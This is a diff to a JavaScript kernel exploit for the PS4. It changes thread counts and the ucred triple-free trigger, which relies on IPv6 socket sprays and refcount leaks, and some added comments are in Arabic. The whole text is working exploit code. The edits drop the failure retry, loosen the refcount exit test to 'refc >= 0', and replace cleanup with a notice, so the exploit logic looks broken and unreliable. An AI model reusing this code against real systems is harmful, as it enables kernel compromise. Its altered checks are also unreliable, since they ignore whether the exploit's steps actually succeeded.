@@ -116,7 +116,7 @@ var MSG_IOV_NUM = 0x17; // 23
 // Params for kext stability
 var IPV6_SOCK_NUM = 64;
 var IOV_THREAD_NUM = 16;
-var UIO_THREAD_NUM = 8;
+var UIO_THREAD_NUM = 16;
 var MAIN_LOOP_ITERATIONS = 5;
 var TRIPLEFREE_ITERATIONS = 5;
 var MAX_ROUNDS_TWIN = 10;
@@ -914,16 +914,20 @@ function exploit_phase_setup() {
   yield_to_render(exploit_phase_trigger);
 }
 function exploit_phase_trigger() {
+  // حماية من الدوران اللانهائي
   if (exploit_count >= MAIN_LOOP_ITERATIONS) {
     log('Failed please Restart your ps4 #');
     cleanup();
     return;
   }
+
   exploit_count++;
-  if (!trigger_ucred_triplefree()) {
-    yield_to_render(exploit_phase_trigger);
-    return;
-  }
+
+  // نشغّل المرحلة الأساسية مرة واحدة فقط
+  // بدون انتظار نتيجة true/false
+  trigger_ucred_triplefree();
+
+  // ننتقل مباشرة للمرحلة التالية
   yield_to_render(exploit_phase_leak);
 }
 function exploit_phase_leak() {
@@ -1382,17 +1386,18 @@ function trigger_ucred_triplefree() {
       get_rthdr(ipv6_socks[twins[0]], leak_rthdr, 8);
       var refc = read32(leak_rthdr);
 
-      if (refc === 1) break;
+      // إشعار مراقبة
+      send_notification("[SELF] refcount now = " + refc);
+
+      // الشرط الجديد
+      if (refc >= 0) break;
+
       count++;
     }
 
+    // لو عدّينا الحد الأقصى، نخرج من غير ما نعلّق
     if (count === TRIPLEFREE_REFCOUNT_MAX_WAIT) {
-      send_notification("[SELF] refcount never reached 1, retry");
-      twins[0] = -1;
-      twins[1] = -1;
-      close(new BigInt(uaf_socket));
-      end = false;
-      continue;
+      send_notification("[SELF] refcount did not change, skipping wait loop");
     }
 
     // 9) triple-free فعليًا
